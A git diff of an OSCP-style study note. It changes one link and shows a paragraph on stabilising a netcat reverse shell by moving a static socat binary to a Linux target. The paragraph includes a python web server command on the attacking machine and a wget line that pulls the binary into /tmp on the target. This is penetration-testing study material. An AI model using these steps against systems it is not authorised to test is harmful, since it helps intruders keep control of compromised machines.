@@ -1,4 +1,4 @@
-Related: [[Tools]] | [[Types of shells]] | [[rlwrap]] | [[Python]]
+Related: [[OSCP/Privilege Escalation/Shell/Tools]] | [[Types of shells]] | [[rlwrap]] | [[Python]]
 
 The third easy way to stabilise a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell. Bear in mind that this technique is limited to **LINUX** targets, as a Socat shell on Windows will be no more stable than a netcat shell. To accomplish this method of stabilisation we would first transfer a [socat static compiled binary (opens in new tab)](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (`sudo python3 -m http.server 80`), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (`wget <LOCAL-IP>/socat -O /tmp/socat`).
 
